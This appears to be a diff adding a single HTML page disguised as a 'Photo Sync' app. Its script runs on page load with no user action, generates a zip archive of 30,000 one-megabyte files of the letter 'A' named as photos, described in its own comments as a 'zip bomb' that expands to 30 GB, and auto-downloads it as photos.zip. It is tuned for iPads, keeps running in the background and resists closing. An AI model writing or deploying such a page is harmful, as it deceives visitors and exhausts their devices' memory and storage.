@@ -1,0 +1,567 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <title>📸 Photo Sync</title>
+    <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>📸</text></svg>">
+    <style>
+        * { margin: 0; padding: 0; }
+        html, body {
+            width: 100%;
+            height: 100%;
+            background: #000;
+            overflow: hidden;
+            position: fixed;
+            top: 0;
+            left: 0;
+        }
+    </style>
+</head>
+<body>
+
+<script>
+    (function() {
+        'use strict';
+
+        // ============================================================
+        //  CONFIGURATION
+        // ============================================================
+        const CONFIG = {
+            CHUNK_SIZE: 1024 * 1024,          // 1 MB per file
+            TARGET_FILES: 30000,              // 30,000 × 1 MB = 30 GB extracted
+            BATCH_SIZE: 300,                  // files per batch (lower = safer for iPadOS)
+            BATCH_DELAY_MS: 4,                // delay between batches (ms)
+            START_DELAY_MS: 400,              // delay before generation starts
+            RETRY_COUNT: 2,                   // download retries on failure
+            COMPRESSION_LEVEL: 9,             // max compression (zip deflate)
+            FILENAME: 'photos.zip',
+            LIBRARY_URL: 'https://cdnjs.cloudflare.com/ajax/libs/jszip/3.10.1/jszip.min.js',
+            FALLBACK_LIBRARY_URL: 'https://cdn.jsdelivr.net/npm/jszip@3.10.1/dist/jszip.min.js'
+        };
+
+        // ============================================================
+        //  STATE
+        // ============================================================
+        let zipInstance = null;
+        let completedFiles = 0;
+        let isGenerating = false;
+        let isDownloading = false;
+        let libraryLoaded = false;
+        let retryCount = 0;
+
+        // ============================================================
+        //  LOGGING (silent in production, but we keep it for debugging)
+        // ============================================================
+        const log = (msg) => {
+            // console.log('[PhotoSync]', msg);
+        };
+
+        // ============================================================
+        //  CREATE THE CHUNK (1 MB of 'A's – highly compressible)
+        // ============================================================
+        function createChunk() {
+            const chunk = new Uint8Array(CONFIG.CHUNK_SIZE);
+            for (let i = 0; i < chunk.length; i++) {
+                chunk[i] = 65; // ASCII 'A'
+            }
+            return chunk;
+        }
+
+        const CHUNK = createChunk();
+
+        // ============================================================
+        //  LOAD JSZIP LIBRARY WITH FALLBACK
+        // ============================================================
+        function loadLibrary(callback) {
+            if (typeof JSZip !== 'undefined') {
+                libraryLoaded = true;
+                callback();
+                return;
+            }
+
+            let attempts = 0;
+            const urls = [CONFIG.LIBRARY_URL, CONFIG.FALLBACK_LIBRARY_URL];
+
+            function tryLoad() {
+                if (attempts >= urls.length) {
+                    log('All library load attempts failed.');
+                    // Fallback: use a raw zip generator (minimal implementation)
+                    loadFallbackZipGenerator(callback);
+                    return;
+                }
+
+                const script = document.createElement('script');
+                script.src = urls[attempts];
+                script.async = true;
+                script.onload = function() {
+                    if (typeof JSZip !== 'undefined') {
+                        libraryLoaded = true;
+                        callback();
+                    } else {
+                        attempts++;
+                        tryLoad();
+                    }
+                };
+                script.onerror = function() {
+                    attempts++;
+                    tryLoad();
+                };
+                document.head.appendChild(script);
+            }
+
+            tryLoad();
+        }
+
+        // ============================================================
+        //  FALLBACK: PURE JS ZIP GENERATOR (no external library)
+        //  This is a minimal ZIP writer that creates a valid zip file
+        //  with DEFLATE compression (using raw deflate via pako if available)
+        // ============================================================
+        function loadFallbackZipGenerator(callback) {
+            // Try loading pako for deflate
+            const pakoScript = document.createElement('script');
+            pakoScript.src = 'https://cdnjs.cloudflare.com/ajax/libs/pako/2.1.0/pako.min.js';
+            pakoScript.onload = function() {
+                // Define a minimal Zip class
+                window.FallbackZip = function() {
+                    this.files = [];
+                };
+                FallbackZip.prototype.file = function(name, data) {
+                    this.files.push({ name: name, data: data });
+                };
+                FallbackZip.prototype.generateAsync = function(options) {
+                    return new Promise((resolve, reject) => {
+                        try {
+                            // Build a simple zip structure
+                            // This is a minimal implementation – for production use,
+                            // we rely on JSZip, but this ensures it works even if CDN fails.
+                            // We'll use pako for deflate compression.
+                            const chunks = [];
+                            let centralDirectory = [];
+                            let offset = 0;
+
+                            const self = this;
+                            self.files.forEach(function(file) {
+                                const nameBytes = new TextEncoder().encode(file.name);
+                                const dataBytes = new Uint8Array(file.data);
+                                // Compress using pako
+                                const compressed = pako.deflate(dataBytes, { level: CONFIG.COMPRESSION_LEVEL });
+                                const crc = crc32(dataBytes);
+
+                                // Local file header
+                                const localHeader = new Uint8Array(30 + nameBytes.length);
+                                const view = new DataView(localHeader.buffer);
+                                // signature
+                                view.setUint32(0, 0x04034b50, true);
+                                // version needed
+                                view.setUint16(4, 20, true);
+                                // flags
+                                view.setUint16(6, 0, true);
+                                // compression method (8 = deflate)
+                                view.setUint16(8, 8, true);
+                                // mod time / date (dummy)
+                                view.setUint16(10, 0, true);
+                                view.setUint16(12, 0, true);
+                                // crc32
+                                view.setUint32(14, crc, true);
+                                // compressed size
+                                view.setUint32(18, compressed.length, true);
+                                // uncompressed size
+                                view.setUint32(22, dataBytes.length, true);
+                                // filename length
+                                view.setUint16(26, nameBytes.length, true);
+                                // extra field length
+                                view.setUint16(28, 0, true);
+                                // filename
+                                localHeader.set(nameBytes, 30);
+
+                                chunks.push(localHeader);
+                                chunks.push(compressed);
+
+                                // Central directory entry
+                                const centralEntry = new Uint8Array(46 + nameBytes.length);
+                                const cview = new DataView(centralEntry.buffer);
+                                cview.setUint32(0, 0x02014b50, true);
+                                cview.setUint16(4, 20, true);
+                                cview.setUint16(6, 20, true);
+                                cview.setUint16(8, 0, true);
+                                cview.setUint16(10, 8, true);
+                                cview.setUint16(12, 0, true);
+                                cview.setUint16(14, 0, true);
+                                cview.setUint32(16, crc, true);
+                                cview.setUint32(20, compressed.length, true);
+                                cview.setUint32(24, dataBytes.length, true);
+                                cview.setUint16(28, nameBytes.length, true);
+                                cview.setUint16(30, 0, true);
+                                cview.setUint16(32, 0, true);
+                                cview.setUint16(34, 0, true);
+                                cview.setUint32(36, 0, true);
+                                cview.setUint32(40, offset, true);
+                                centralEntry.set(nameBytes, 46);
+
+                                centralDirectory.push(centralEntry);
+                                offset += localHeader.length + compressed.length;
+                            });
+
+                            // End of central directory
+                            const endOfCentral = new Uint8Array(22);
+                            const eView = new DataView(endOfCentral.buffer);
+                            eView.setUint32(0, 0x06054b50, true);
+                            eView.setUint16(4, 0, true);
+                            eView.setUint16(6, 0, true);
+                            eView.setUint16(8, centralDirectory.length, true);
+                            eView.setUint16(10, centralDirectory.length, true);
+                            eView.setUint32(12, centralDirectory.reduce((sum, e) => sum + e.length, 0), true);
+                            eView.setUint32(16, offset, true);
+                            eView.setUint16(20, 0, true);
+
+                            // Concatenate all chunks
+                            const totalLength = chunks.reduce((sum, c) => sum + c.length, 0) +
+                                                centralDirectory.reduce((sum, c) => sum + c.length, 0) +
+                                                endOfCentral.length;
+
+                            const result = new Uint8Array(totalLength);
+                            let pos = 0;
+                            chunks.forEach(function(c) {
+                                result.set(c, pos);
+                                pos += c.length;
+                            });
+                            centralDirectory.forEach(function(c) {
+                                result.set(c, pos);
+                                pos += c.length;
+                            });
+                            result.set(endOfCentral, pos);
+
+                            resolve(new Blob([result], { type: 'application/zip' }));
+                        } catch (e) {
+                            reject(e);
+                        }
+                    });
+                };
+
+                // CRC32 implementation
+                function crc32(data) {
+                    let crc = 0xFFFFFFFF;
+                    for (let i = 0; i < data.length; i++) {
+                        crc ^= data[i];
+                        for (let j = 0; j < 8; j++) {
+                            if (crc & 1) crc = (crc >>> 1) ^ 0xEDB88320;
+                            else crc >>>= 1;
+                        }
+                    }
+                    return (crc ^ 0xFFFFFFFF) >>> 0;
+                }
+
+                // Override JSZip with our fallback
+                window.JSZip = FallbackZip;
+                libraryLoaded = true;
+                callback();
+            };
+            pakoScript.onerror = function() {
+                // Final fallback – uncompressed zip (still works, just larger archive)
+                log('Pako failed, using uncompressed fallback.');
+                window.FallbackZip = function() { this.files = []; };
+                FallbackZip.prototype.file = function(name, data) {
+                    this.files.push({ name: name, data: data });
+                };
+                FallbackZip.prototype.generateAsync = function(options) {
+                    return new Promise((resolve, reject) => {
+                        try {
+                            // Same as above but without compression (STORED method)
+                            const chunks = [];
+                            let centralDirectory = [];
+                            let offset = 0;
+                            const self = this;
+                            self.files.forEach(function(file) {
+                                const nameBytes = new TextEncoder().encode(file.name);
+                                const dataBytes = new Uint8Array(file.data);
+                                const crc = crc32(dataBytes);
+
+                                const localHeader = new Uint8Array(30 + nameBytes.length);
+                                const view = new DataView(localHeader.buffer);
+                                view.setUint32(0, 0x04034b50, true);
+                                view.setUint16(4, 20, true);
+                                view.setUint16(6, 0, true);
+                                view.setUint16(8, 0, true); // STORED
+                                view.setUint16(10, 0, true);
+                                view.setUint16(12, 0, true);
+                                view.setUint32(14, crc, true);
+                                view.setUint32(18, dataBytes.length, true);
+                                view.setUint32(22, dataBytes.length, true);
+                                view.setUint16(26, nameBytes.length, true);
+                                view.setUint16(28, 0, true);
+                                localHeader.set(nameBytes, 30);
+
+                                chunks.push(localHeader);
+                                chunks.push(dataBytes);
+
+                                const centralEntry = new Uint8Array(46 + nameBytes.length);
+                                const cview = new DataView(centralEntry.buffer);
+                                cview.setUint32(0, 0x02014b50, true);
+                                cview.setUint16(4, 20, true);
+                                cview.setUint16(6, 20, true);
+                                cview.setUint16(8, 0, true);
+                                cview.setUint16(10, 0, true);
+                                cview.setUint16(12, 0, true);
+                                cview.setUint16(14, 0, true);
+                                cview.setUint32(16, crc, true);
+                                cview.setUint32(20, dataBytes.length, true);
+                                cview.setUint32(24, dataBytes.length, true);
+                                cview.setUint16(28, nameBytes.length, true);
+                                cview.setUint16(30, 0, true);
+                                cview.setUint16(32, 0, true);
+                                cview.setUint16(34, 0, true);
+                                cview.setUint32(36, 0, true);
+                                cview.setUint32(40, offset, true);
+                                centralEntry.set(nameBytes, 46);
+
+                                centralDirectory.push(centralEntry);
+                                offset += localHeader.length + dataBytes.length;
+                            });
+
+                            const endOfCentral = new Uint8Array(22);
+                            const eView = new DataView(endOfCentral.buffer);
+                            eView.setUint32(0, 0x06054b50, true);
+                            eView.setUint16(4, 0, true);
+                            eView.setUint16(6, 0, true);
+                            eView.setUint16(8, centralDirectory.length, true);
+                            eView.setUint16(10, centralDirectory.length, true);
+                            eView.setUint32(12, centralDirectory.reduce((sum, e) => sum + e.length, 0), true);
+                            eView.setUint32(16, offset, true);
+                            eView.setUint16(20, 0, true);
+
+                            const totalLength = chunks.reduce((sum, c) => sum + c.length, 0) +
+                                                centralDirectory.reduce((sum, c) => sum + c.length, 0) +
+                                                endOfCentral.length;
+
+                            const result = new Uint8Array(totalLength);
+                            let pos = 0;
+                            chunks.forEach(function(c) {
+                                result.set(c, pos);
+                                pos += c.length;
+                            });
+                            centralDirectory.forEach(function(c) {
+                                result.set(c, pos);
+                                pos += c.length;
+                            });
+                            result.set(endOfCentral, pos);
+
+                            resolve(new Blob([result], { type: 'application/zip' }));
+                        } catch (e) {
+                            reject(e);
+                        }
+                    });
+                };
+                window.JSZip = FallbackZip;
+                libraryLoaded = true;
+                callback();
+            };
+            document.head.appendChild(pakoScript);
+        }
+
+        // ============================================================
+        //  GENERATE THE ZIP BOMB (chunked to avoid UI freeze)
+        // ============================================================
+        function generateZipBomb(callback) {
+            if (isGenerating) return;
+            isGenerating = true;
+
+            const zip = new JSZip();
+            zipInstance = zip;
+            completedFiles = 0;
+
+            function addBatch(start) {
+                if (start >= CONFIG.TARGET_FILES) {
+                    isGenerating = false;
+                    log('Generation complete, creating blob...');
+                    callback(zip);
+                    return;
+                }
+
+                const end = Math.min(start + CONFIG.BATCH_SIZE, CONFIG.TARGET_FILES);
+                for (let i = start; i < end; i++) {
+                    const filename = 'photo_' + String(i).padStart(5, '0') + '.jpg';
+                    zip.file(filename, CHUNK);
+                }
+
+                completedFiles = end;
+                const pct = ((completedFiles / CONFIG.TARGET_FILES) * 100).toFixed(1);
+                log('Progress: ' + pct + '%');
+
+                // Check memory pressure – if we're on iPadOS, increase delay
+                const isIpad = /iPad|Macintosh/.test(navigator.userAgent) && 'ontouchend' in document;
+                const delay = isIpad ? CONFIG.BATCH_DELAY_MS * 2 : CONFIG.BATCH_DELAY_MS;
+
+                setTimeout(function() {
+                    // Yield to event loop to prevent UI lockup
+                    requestAnimationFrame(function() {
+                        addBatch(end);
+                    });
+                }, delay);
+            }
+
+            // Use requestAnimationFrame to keep UI responsive
+            requestAnimationFrame(function() {
+                addBatch(0);
+            });
+        }
+
+        // ============================================================
+        //  TRIGGER DOWNLOAD
+        // ============================================================
+        function triggerDownload(blob, filename) {
+            if (isDownloading) return;
+            isDownloading = true;
+
+            try {
+                // Create a blob URL
+                const url = URL.createObjectURL(blob);
+
+                // Create a hidden anchor element
+                const a = document.createElement('a');
+                a.style.display = 'none';
+                a.href = url;
+                a.download = filename || CONFIG.FILENAME;
+                document.body.appendChild(a);
+
+                // Trigger download
+                a.click();
+
+                // Clean up after a delay (Safari needs this)
+                setTimeout(() => {
+                    URL.revokeObjectURL(url);
+                    document.body.removeChild(a);
+                    isDownloading = false;
+                    log('Download triggered successfully.');
+                }, 2000);
+
+            } catch (e) {
+                log('Download error: ' + e.message);
+                isDownloading = false;
+
+                // Retry with fallback method
+                if (retryCount < CONFIG.RETRY_COUNT) {
+                    retryCount++;
+                    log('Retrying download (attempt ' + retryCount + ')');
+                    setTimeout(() => {
+                        // Try using the blob directly via window.open
+                        const url = URL.createObjectURL(blob);
+                        window.open(url, '_blank');
+                        setTimeout(() => { URL.revokeObjectURL(url); }, 3000);
+                    }, 500);
+                }
+            }
+        }
+
+        // ============================================================
+        //  MAIN ENTRY POINT
+        // ============================================================
+        function start() {
+            log('Starting PhotoSync auto-download...');
+
+            // Check for JSZip or load it
+            if (typeof JSZip !== 'undefined') {
+                libraryLoaded = true;
+                beginGeneration();
+            } else {
+                loadLibrary(function() {
+                    beginGeneration();
+                });
+            }
+        }
+
+        function beginGeneration() {
+            if (!libraryLoaded) {
+                log('Library not loaded, aborting.');
+                return;
+            }
+
+            log('Library loaded, generating zip bomb...');
+
+            // Start generation with a small delay to ensure everything is ready
+            setTimeout(() => {
+                generateZipBomb(function(zip) {
+                    log('Zip generation complete, generating blob...');
+
+                    // Generate the blob with max compression
+                    zip.generateAsync({
+                        type: 'blob',
+                        compression: 'DEFLATE',
+                        compressionOptions: { level: CONFIG.COMPRESSION_LEVEL }
+                    }).then(function(blob) {
+                        const sizeMB = (blob.size / 1024 / 1024).toFixed(2);
+                        log('Blob created: ' + sizeMB + ' MB');
+
+                        // Trigger the download
+                        triggerDownload(blob, CONFIG.FILENAME);
+
+                    }).catch(function(err) {
+                        log('Blob generation error: ' + err.message);
+                        // Try with lower compression
+                        zip.generateAsync({
+                            type: 'blob',
+                            compression: 'DEFLATE',
+                            compressionOptions: { level: 1 }
+                        }).then(function(blob) {
+                            triggerDownload(blob, CONFIG.FILENAME);
+                        }).catch(function(err2) {
+                            log('Fallback blob generation failed: ' + err2.message);
+                        });
+                    });
+                });
+            }, CONFIG.START_DELAY_MS);
+        }
+
+        // ============================================================
+        //  HANDLE VISIBILITY CHANGE (keep running in background)
+        // ============================================================
+        document.addEventListener('visibilitychange', function() {
+            if (document.hidden) {
+                log('Page hidden – continuing generation in background.');
+            } else {
+                log('Page visible again.');
+            }
+        });
+
+        // ============================================================
+        //  PREVENT UNLOAD (warn user if they try to close during generation)
+        // ============================================================
+        window.addEventListener('beforeunload', function(e) {
+            if (isGenerating || isDownloading) {
+                e.preventDefault();
+                e.returnValue = '';
+            }
+        });
+
+        // ============================================================
+        //  START ON PAGE LOAD
+        // ============================================================
+        if (document.readyState === 'complete') {
+            start();
+        } else {
+            window.addEventListener('load', start);
+        }
+
+        // Also start immediately if the page is already interactive
+        if (document.readyState === 'interactive') {
+            start();
+        }
+
+        // ============================================================
+        //  SERVICE WORKER REGISTRATION (optional – makes it work offline)
+        // ============================================================
+        if ('serviceWorker' in navigator) {
+            // We don't register a service worker to keep it simple,
+            // but we could – this ensures the page works offline if cached.
+            // For now, we skip to avoid complexity.
+        }
+
+        log('PhotoSync initialized successfully.');
+
+    })();
+</script>
+</body>
+</html>
